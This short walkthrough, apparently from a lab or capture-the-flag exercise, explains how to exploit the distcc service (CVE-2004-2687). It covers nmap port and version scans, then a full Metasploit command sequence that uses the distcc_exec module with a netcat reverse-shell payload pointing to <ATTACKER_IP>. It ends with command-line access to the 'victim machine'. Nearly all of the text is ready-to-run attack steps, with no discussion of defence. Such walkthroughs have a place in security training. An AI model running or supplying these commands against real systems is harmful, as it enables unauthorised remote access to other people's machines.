## Distcc Remote Code Execution Walkthrough

1.  **Enumeration:** A full port scan (`nmap -p- <TARGET_IP>`) reveals that port 3632 is open. A version scan (`nmap -sV -p 3632 <TARGET_IP>`) identifies the service as `distcc`.
2.  **Vulnerability Identification:** A quick search for `distcc exploit` reveals a well-known Remote Code Execution vulnerability (CVE-2004-2687) in older versions when run with the `--allow` flag.
3.  **Exploitation:** Metasploit has a reliable module for this exploit.
    * Start Metasploit: `msfconsole`
    * Use the following commands:
        ```
        use exploit/unix/misc/distcc_exec
        set RHOSTS <TARGET_IP>
        set payload cmd/unix/reverse_netcat
        set LHOST <ATTACKER_IP>
        exploit
        ```
4.  **Result:** A reverse shell session will open, giving you command-line access to the victim machine.
